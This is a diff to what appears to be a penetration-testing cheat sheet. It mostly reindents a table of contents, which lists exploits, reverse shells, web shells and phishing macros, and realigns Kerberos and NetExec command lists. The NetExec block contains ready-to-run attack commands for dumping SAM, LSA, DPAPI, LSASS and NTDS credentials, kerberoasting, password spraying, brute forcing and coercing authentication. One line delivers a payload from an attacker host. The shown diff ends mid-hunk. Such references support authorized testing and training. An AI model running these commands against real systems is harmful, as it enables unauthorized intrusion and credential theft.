@@ -47,153 +47,153 @@ Thank you for reading.
 - [Reporting](#reporting)
 - [Social Media Resources](#social-media-resources)
 - [Commands](#commands)
-	- [Basics](#basics-1)
-		- [curl](#curl)
-		- [File Transfer](#file-transfer)
-  		- [FTP](#ftp)
-		- [Kerberos](#kerberos)
-		- [Linux](#linux)
-		- [Microsoft Windows](#microsoft-windows)
-		- [PHP Webserver](#php-webserver)
-		- [Ping](#ping)
-		- [Port Forwarding](#port-forwarding-1)
-		- [Python Webserver](#python-webserver)
-		- [RDP](#rdp)
-		- [showmount](#showmount)
-  		- [SMB](#smb)
-		- [smbclient](#smbclient)
-		- [SSH](#ssh)
-		- [Time and Date](#time-and-date)
-		- [Tmux](#tmux)
-		- [Upgrading Shells](#upgrading-shells)
-		- [VirtualBox](#virtualbox)
-		- [virtualenv](#virtualenv)
-	- [Information Gathering](#information-gathering-1)
-		- [memcached](#memcached)
-		- [NetBIOS](#netbios)
-		- [Nmap](#nmap)
-		- [Port Scanning](#port-scanning)
-		- [snmpwalk](#snmpwalk)
-	- [Web Application Analysis](#web-application-analysis-1)
-		- [Burp Suite](#burp-suite)
-  		- [cadaver](#cadaver)
-		- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
-		- [fuss faster You fool (ffuf) ](#ffuf)
+    - [Basics](#basics-1)
+        - [curl](#curl)
+        - [File Transfer](#file-transfer)
+        - [FTP](#ftp)
+        - [Kerberos](#kerberos)
+        - [Linux](#linux)
+        - [Microsoft Windows](#microsoft-windows)
+        - [PHP Webserver](#php-webserver)
+        - [Ping](#ping)
+        - [Port Forwarding](#port-forwarding-1)
+        - [Python Webserver](#python-webserver)
+        - [RDP](#rdp)
+        - [showmount](#showmount)
+        - [SMB](#smb)
+        - [smbclient](#smbclient)
+        - [SSH](#ssh)
+        - [Time and Date](#time-and-date)
+        - [Tmux](#tmux)
+        - [Upgrading Shells](#upgrading-shells)
+        - [VirtualBox](#virtualbox)
+        - [virtualenv](#virtualenv)
+    - [Information Gathering](#information-gathering-1)
+        - [memcached](#memcached)
+        - [NetBIOS](#netbios)
+        - [Nmap](#nmap)
+        - [Port Scanning](#port-scanning)
+        - [snmpwalk](#snmpwalk)
+    - [Web Application Analysis](#web-application-analysis-1)
+        - [Burp Suite](#burp-suite)
+        - [cadaver](#cadaver)
+        - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
+        - [fuss faster You fool (ffuf) ](#ffuf)
         - [feroxbuster](#feroxbuster)
-		- [Gobuster](#gobuster)
-		- [GitTools](#gittools)
-		- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
-		- [PDF PHP Inclusion](#pdf-php-inclusion)
-		- [PHP Upload Filter Bypasses](#php-upload-filter-bypasses)
-		- [PHP Filter Chain Generator](#php-filter-chain-generator)
-		- [PHP Generic Gadget Chains (PHPGGC)](#php-generic-gadget-chains-phpggc)
-		- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
-		- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
-		- [Upload Vulnerabilities](#upload-vulnerabilities)
-		- [wfuzz](#wfuzz)
-		- [WPScan](#wpscan)
-		- [XML External Entity (XXE)](#xml-external-entity-xxe)
-	- [Database Analysis](#database-analysis)
- 		- [impacket-mssqlclient](#impacket-mssqlclient)
-		- [MongoDB](#mongodb)
-		- [MSSQL](#mssql)
-		- [MySQL](#mysql)
-		- [NoSQL Injection](#nosql-injection)
-		- [PostgreSQL](#postgresql)
-		- [Redis](#redis)
-		- [SQL Injection](#sql-injection)
-		- [SQL Truncation Attack](#sql-truncation-attack)
-		- [sqlite3](#sqlite3)
-		- [sqsh](#sqsh)
-	- [Password Attacks](#password-attacks-1)
-		- [DonPAPI](#donpapi)
-		- [fcrack](#fcrack)
-  		- [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
-		- [hashcat](#hashcat)
-		- [Hydra](#hydra)
-		- [John](#john)
-		- [Kerbrute](#kerbrute)
-		- [LaZagne](#lazagne)
-		- [mimikatz](#mimikatz)
-  		- [NetExec](#netexec)
-		- [pypykatz](#pypykatz)
-		- [Spray-Passwords](#spray-passwords)
-	- [Exploitation Tools](#exploitation-tools-1)
-		- [Metasploit](#metasploit)
-	- [Post Exploitation](#post-exploitation-1)
- 		- [Account Operators Group Membership](#account-operators-group-membership)
- 		- [Active Directory](#active-directory)
- 		- [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
-		- [ADCSTemplate](#adcstemplate)
-  		- [ADMiner](#adminer)
-		- [BloodHound](#bloodhound)
-		- [BloodHound Python](#bloodhound-python)
-  		- [bloodyAD](#bloodyAD)
-		- [Certify](#certify)
-		- [Certipy](#certipy)
-		- [enum4linux-ng](#enum4linux-ng)
-		- [Evil-WinRM](#evil-winrm)
-		- [Impacket](#impacket-1)
-		- [JAWS](#jaws)
-		- [Kerberos](#kerberos-1)
-		- [ldapsearch](#ldapsearch)
-		- [Linux](#linux-1)
-		- [Microsoft Windows](#microsoft-windows-1)
-		- [PassTheCert](#passthecert)
-		- [PKINITtools](#pkinittools)
-		- [Port Scanning](#port-scanning-1)
-		- [powercat](#powercat)
-		- [Powermad](#powermad)
-		- [PowerShell](#powershell)
-  		- [PrivescCheck](#privesccheck)
-		- [pwncat](#pwncat)
-		- [rpcclient](#rpcclient)
-		- [Rubeus](#rubeus)
-		- [RunasCs](#runascs)
-		- [Seatbelt](#seatbelt)
-		- [Shadow Credentials](#shadow-credentials)
-		- [smbpasswd](#smbpasswd)
-		- [winexe](#winexe)
-	- [Social Engineering Tools](#social-engineering-tools)
-		- [Microsoft Office Word Phishing Macro](#microsoft-office-word-phishing-macro)
-		- [Microsoft Windows Library Files](#microsoft-windows-library-files)
-	- [CVE](#cve)
-		- [CVE-2014-6271: Shellshock RCE PoC](#cve-2014-6271-shellshock-rce-poc)
-		- [CVE-2016-1531: exim LPE](#cve-2016-1531-exim-lpe)
-		- [CVE-2019-14287: Sudo Bypass](#cve-2019-14287-sudo-bypass)
-		- [CVE-2020-1472: ZeroLogon PE](#cve-2020-1472-zerologon-pe)
-		- [CVE-2021–3156: Sudo / sudoedit LPE](#cve-2021-3156-sudo--sudoedit-lpe)
-		- [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
-		- [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
-		- [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
-		- [CVE-2022-31214: Firejail LPE](#cve-2022-31214-firejail-lpe)
-		- [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
-		- [CVE-2023-22809: Sudo Bypass](#cve-2023-22809-sudo-bypass)
-		- [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
-  		- [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
-   		- [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
-   		- [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
-  		- [GodPotato LPE](#godpotato-lpe)
-		- [Juicy Potato LPE](#juicy-potato-lpe)
-  		- [JuicyPotatoNG LPE](#juicypotatong-lpe)
-		- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
-  		- [PrintSpoofer LPE](#printspoofer-lpe)
-		- [SharpEfsPotato LPE](#sharpefspotato-lpe)
-		- [Shocker Container Escape](#shocker-container-escape)
-	- [Payloads](#payloads-1)
-		- [Exiftool](#exiftool)
-		- [Reverse Shells](#reverse-shells)
-		- [Web Shells](#web-shells)
-	- [Templates](#templates)
-		- [ASPX Web Shell](#aspx-web-shell)
-		- [Bad YAML](#bad-yaml)
-	- [Wordlists](#wordlists-1)
-		- [Bash](#bash)
-		- [CeWL](#cewl)
-		- [CUPP](#cupp)
-		- [crunch](#crunch)
-  		- [JavaScript Quick Wordlist](#javascript-quick-wordlist)
-		- [Username Anarchy](#username-anarchy)
+        - [Gobuster](#gobuster)
+        - [GitTools](#gittools)
+        - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
+        - [PDF PHP Inclusion](#pdf-php-inclusion)
+        - [PHP Upload Filter Bypasses](#php-upload-filter-bypasses)
+        - [PHP Filter Chain Generator](#php-filter-chain-generator)
+        - [PHP Generic Gadget Chains (PHPGGC)](#php-generic-gadget-chains-phpggc)
+        - [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
+        - [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
+        - [Upload Vulnerabilities](#upload-vulnerabilities)
+        - [wfuzz](#wfuzz)
+        - [WPScan](#wpscan)
+        - [XML External Entity (XXE)](#xml-external-entity-xxe)
+    - [Database Analysis](#database-analysis)
+        - [impacket-mssqlclient](#impacket-mssqlclient)
+        - [MongoDB](#mongodb)
+        - [MSSQL](#mssql)
+        - [MySQL](#mysql)
+        - [NoSQL Injection](#nosql-injection)
+        - [PostgreSQL](#postgresql)
+        - [Redis](#redis)
+        - [SQL Injection](#sql-injection)
+        - [SQL Truncation Attack](#sql-truncation-attack)
+        - [sqlite3](#sqlite3)
+        - [sqsh](#sqsh)
+    - [Password Attacks](#password-attacks-1)
+        - [DonPAPI](#donpapi)
+        - [fcrack](#fcrack)
+        - [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
+        - [hashcat](#hashcat)
+        - [Hydra](#hydra)
+        - [John](#john)
+        - [Kerbrute](#kerbrute)
+        - [LaZagne](#lazagne)
+        - [mimikatz](#mimikatz)
+        - [NetExec](#netexec)
+        - [pypykatz](#pypykatz)
+        - [Spray-Passwords](#spray-passwords)
+    - [Exploitation Tools](#exploitation-tools-1)
+        - [Metasploit](#metasploit)
+    - [Post Exploitation](#post-exploitation-1)
+        - [Account Operators Group Membership](#account-operators-group-membership)
+        - [Active Directory](#active-directory)
+        - [Active Directory Certificate Services (AD CS)](#active-directory-certificate-services-ad-cs)
+        - [ADCSTemplate](#adcstemplate)
+        - [ADMiner](#adminer)
+        - [BloodHound](#bloodhound)
+        - [BloodHound Python](#bloodhound-python)
+        - [bloodyAD](#bloodyAD)
+        - [Certify](#certify)
+        - [Certipy](#certipy)
+        - [enum4linux-ng](#enum4linux-ng)
+        - [Evil-WinRM](#evil-winrm)
+        - [Impacket](#impacket-1)
+        - [JAWS](#jaws)
+        - [Kerberos](#kerberos-1)
+        - [ldapsearch](#ldapsearch)
+        - [Linux](#linux-1)
+        - [Microsoft Windows](#microsoft-windows-1)
+        - [PassTheCert](#passthecert)
+        - [PKINITtools](#pkinittools)
+        - [Port Scanning](#port-scanning-1)
+        - [powercat](#powercat)
+        - [Powermad](#powermad)
+        - [PowerShell](#powershell)
+        - [PrivescCheck](#privesccheck)
+        - [pwncat](#pwncat)
+        - [rpcclient](#rpcclient)
+        - [Rubeus](#rubeus)
+        - [RunasCs](#runascs)
+        - [Seatbelt](#seatbelt)
+        - [Shadow Credentials](#shadow-credentials)
+        - [smbpasswd](#smbpasswd)
+        - [winexe](#winexe)
+    - [Social Engineering Tools](#social-engineering-tools)
+        - [Microsoft Office Word Phishing Macro](#microsoft-office-word-phishing-macro)
+        - [Microsoft Windows Library Files](#microsoft-windows-library-files)
+    - [CVE](#cve)
+        - [CVE-2014-6271: Shellshock RCE PoC](#cve-2014-6271-shellshock-rce-poc)
+        - [CVE-2016-1531: exim LPE](#cve-2016-1531-exim-lpe)
+        - [CVE-2019-14287: Sudo Bypass](#cve-2019-14287-sudo-bypass)
+        - [CVE-2020-1472: ZeroLogon PE](#cve-2020-1472-zerologon-pe)
+        - [CVE-2021–3156: Sudo / sudoedit LPE](#cve-2021-3156-sudo--sudoedit-lpe)
+        - [CVE-2021-44228: Log4Shell RCE (0-day)](#cve-2021-44228-log4shell-rce-0-day)
+        - [CVE-2022-0847: Dirty Pipe LPE](#cve-2022-0847-dirty-pipe-lpe)
+        - [CVE-2022-22963: Spring4Shell RCE (0-day)](#cve-2022-22963-spring4shell-rce-0-day)
+        - [CVE-2022-31214: Firejail LPE](#cve-2022-31214-firejail-lpe)
+        - [CVE-2023-21746: Windows NTLM EoP LocalPotato LPE](#cve-2023-21746-windows-ntlm-eop-localpotato-lpe)
+        - [CVE-2023-22809: Sudo Bypass](#cve-2023-22809-sudo-bypass)
+        - [CVE-2023-32629, CVE-2023-2640: GameOverlay Ubuntu Kernel Exploit LPE (0-day)](#cve-2023-32629-cve-2023-2640-gameoverlay-ubuntu-kernel-exploit-lpe-0-day)
+        - [CVE-2023-4911: Looney Tunables LPE](#cve-2023-4911-looney-tunables-lpe)
+        - [CVE-2023-7028: GitLab Account Takeover](#cve-2023-7028-gitlab-account-takeover)
+        - [CVE-2024-4577: PHP-CGI Argument Injection Vulnerability RCE](#cve-2024-4577-php-cgi-argument-injection-vulnerability-rce)
+        - [GodPotato LPE](#godpotato-lpe)
+        - [Juicy Potato LPE](#juicy-potato-lpe)
+        - [JuicyPotatoNG LPE](#juicypotatong-lpe)
+        - [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](#mysql-4x50-user-defined-function-udf-dynamic-library-2-lpe)
+        - [PrintSpoofer LPE](#printspoofer-lpe)
+        - [SharpEfsPotato LPE](#sharpefspotato-lpe)
+        - [Shocker Container Escape](#shocker-container-escape)
+    - [Payloads](#payloads-1)
+        - [Exiftool](#exiftool)
+        - [Reverse Shells](#reverse-shells)
+        - [Web Shells](#web-shells)
+    - [Templates](#templates)
+        - [ASPX Web Shell](#aspx-web-shell)
+        - [Bad YAML](#bad-yaml)
+    - [Wordlists](#wordlists-1)
+        - [Bash](#bash)
+        - [CeWL](#cewl)
+        - [CUPP](#cupp)
+        - [crunch](#crunch)
+        - [JavaScript Quick Wordlist](#javascript-quick-wordlist)
+        - [Username Anarchy](#username-anarchy)
 
 ### Basics
 
@@ -652,17 +652,17 @@ export KRB5CCNAME='realpath <FILE>.ccache'
 ##### Kerberos related Files
 
 ```c
-/etc/krb5.conf                   // kerberos configuration file location
-kinit <USERNAME>                 // creating ticket request
-klist                            // show available kerberos tickets
-kdestroy                         // delete cached kerberos tickets
-.k5login                         // resides kerberos principals for login (place in home directory)
-krb5.keytab                      // "key table" file for one or more principals
-kadmin                           // kerberos administration console
-add_principal <EMAIL>            // add a new user to a keytab file
-ksu                              // executes a command with kerberos authentication
-klist -k /etc/krb5.keytab        // lists keytab file
-kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the keytab file
+/etc/krb5.conf                          // kerberos configuration file location
+echo 'PASSWORD' | kinit <USERNAME>       // creating ticket request
+klist                                   // show available kerberos tickets
+kdestroy                                // delete cached kerberos tickets
+.k5login                                // resides kerberos principals for login (place in home directory)
+krb5.keytab                             // "key table" file for one or more principals
+kadmin                                  // kerberos administration console
+add_principal <EMAIL>                   // add a new user to a keytab file
+ksu                                     // executes a command with kerberos authentication
+klist -k /etc/krb5.keytab               // lists keytab file
+kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab   // enables editing of the keytab file
 ```
 
 ##### Ticket Conversion
@@ -3332,79 +3332,84 @@ dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
 #### NetExec
 
 ```c
-netexec smb <RHOST> -u '' -p '' --shares                                         // List SMB shares as anonymous
-netexec smb <RHOST> -u '' -p '' --shares -M spider_plus                          // List shares & spider files
-netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false       // Spider shares, allow write
-netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true    // Spider & download files
+netexec smb <RHOST> -u '' -p '' --shares                                                // List SMB shares as anonymous
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus                                 // List shares & spider files
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false              // Spider shares, allow write
+netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true           // Spider & download files
 netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999 // Spider & download large files
-netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE>         // Download specific file from share
-netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute                        // RID brute force user enumeration
-netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000                 // RID brute with custom max
+netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE>                // Download specific file from share
+netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute                               // RID brute force user enumeration
+netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000                        // RID brute with custom max
 netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser' | awk '{print $6}' // Extract usernames from RID brute
-netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users                         // List users with Kerberos ticket
-netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam                           // Dump SAM hashes with Kerberos ticket
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares                     // List shares with credentials
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir       // List directory in share
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir "FOLDER" // List specific folder
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam                        // Dump SAM hashes
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa                        // Dump LSA secrets
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi                      // Dump DPAPI secrets
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam           // Local SAM dump
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa           // Local LSA dump
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi         // Local DPAPI dump
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av                   // Enumerate antivirus
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc                       // WinRM command check
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped                   // Enumerate snippets
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy                    // Dump LSASS
+netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users                                // List users with Kerberos ticket
+netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam                                  // Dump SAM hashes with Kerberos ticket
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares                            // List shares with credentials
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir              // List directory in share
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir "FOLDER"     // List specific folder
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam                               // Dump SAM hashes
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa                               // Dump LSA secrets
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi                             // Dump DPAPI secrets
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam                  // Local SAM dump
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa                  // Local LSA dump
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi                // Local DPAPI dump
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av                          // Enumerate antivirus
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc                              // WinRM command check
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped                          // Enumerate snippets
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy                           // Dump LSASS
 netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE> // Web delivery payload
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin             // Group Policy Preferences autologin
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password              // GPP password extraction
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history        // PowerShell history extraction
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST> // Coerce authentication
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds                       // Dump NTDS.dit
-netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds                       // Dump NTDS.dit with hash
-netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>     // Dump NTDS for user
-netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>     // Dump NTDS for user with hash
-netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"                      // Exec command with hash
-netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>                         // Generate relay list
-netexec ldap <RHOST> -u '' -p '' -M user-desc                                   // Enumerate user descriptions
-netexec ldap <RHOST> -u '' -p '' -M get-desc-users                               // Get users with descriptions
-netexec ldap <RHOST> -u '' -p '' -M ldap-checker                                 // LDAP checker module
-netexec ldap <RHOST> -u '' -p '' -M veeam                                        // Veeam module
-netexec ldap <RHOST> -u '' -p '' -M maq                                          // MachineAccountQuota module
-netexec ldap <RHOST> -u '' -p '' -M adcs                                         // ADCS module
-netexec ldap <RHOST> -u '' -p '' -M zerologon                                    // Zerologon check
-netexec ldap <RHOST> -u '' -p '' -M petitpotam                                   // PetitPotam check
-netexec ldap <RHOST> -u '' -p '' -M nopac                                        // NoPAC check
-netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami                          // Whoami with Kerberos ticket
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting // Kerberoast hashes
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast // AS-REP roast hashes
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa                      // Enumerate GMSA accounts
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k                   // GMSA with Kerberos
-faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --users // Enumerate users with Kerberos ticket
-faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --active-users // Enumerate active users with Kerberos ticket
-faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --groups // Enumerate groups with Kerberos ticket
-faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --groups "GROUP_NAME"      // Enumerate users in specific group with Kerberos ticket
-faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache -M get-desc-user      // Get full user description with Kerberos ticket
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin                    // Group Policy Preferences autologin
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password                     // GPP password extraction
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M powershell_history               // PowerShell history extraction
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M coerce_plus -o LISTENER=<LHOST>  // Coerce authentication
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds                              // Dump NTDS.dit
+netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds                              // Dump NTDS.dit with hash
+netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>            // Dump NTDS for user
+netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>            // Dump NTDS for user with hash
+netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"                             // Exec command with hash
+netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>                                // Generate relay list
+
+netexec ldap <RHOST> -u '' -p '' -M user-desc                                           // Enumerate user descriptions
+netexec ldap <RHOST> -u '' -p '' -M get-desc-users                                      // Get users with descriptions
+netexec ldap <RHOST> -u '' -p '' -M ldap-checker                                        // LDAP checker module
+netexec ldap <RHOST> -u '' -p '' -M veeam                                               // Veeam module
+netexec ldap <RHOST> -u '' -p '' -M maq                                                 // MachineAccountQuota module
+netexec ldap <RHOST> -u '' -p '' -M adcs                                                // ADCS module
+netexec ldap <RHOST> -u '' -p '' -M zerologon                                           // Zerologon check
+netexec ldap <RHOST> -u '' -p '' -M petitpotam                                          // PetitPotam check
+netexec ldap <RHOST> -u '' -p '' -M nopac                                               // NoPAC check
+netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami                                 // Whoami with Kerberos ticket
+
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting   // Kerberoast hashes
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast         // AS-REP roast hashes
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa                                  // Enumerate GMSA accounts
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k                               // GMSA with Kerberos
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --users                         // Enumerate users with Kerberos ticket
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --active-users                  // Enumerate active users with Kerberos ticket
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --groups                        // Enumerate groups with Kerberos ticket
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache --groups "GROUP_NAME"           // Enumerate users in specific group with Kerberos ticket
+faketime 'now + 8 hours' netexec ldap <RHOST> -u 'USERNAME' -p '<PASSWORD>' --use-kcache -M get-desc-user                // Get full user description with Kerberos ticket
 faketime 'now + 8 hours' netexec ldap <RHOST> --kdcHost <IP> --use-kache --bloodhound --collection All <FQDN> --dns-server <IP> // Bloodhound collection with Kerberos ticket
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>      // Convert GMSA ID
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT> // Decrypt GMSA LSA
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation           // Find delegation
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true  // Get full network info
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All // Bloodhound collection
+
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>               // Convert GMSA ID
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>         // Decrypt GMSA LSA
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation                    // Find delegation
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true           // Get full network info
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All      // Bloodhound collection
 netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All // Bloodhound with Kerberos
-netexec winrm <NETWORK>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .                  // WinRM spray
-netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>                        // WinRM with domain
-netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> // WinRM brute
+
+netexec winrm <NETWORK>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .                           // WinRM spray
+netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>                                 // WinRM with domain
+netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>        // WinRM brute
 netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding // WinRM brute ignore pw decoding
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --no-bruteforce --continue-on-success // No brute, continue on success
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares // List shares (generic)
-netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue // List shares, continue on success
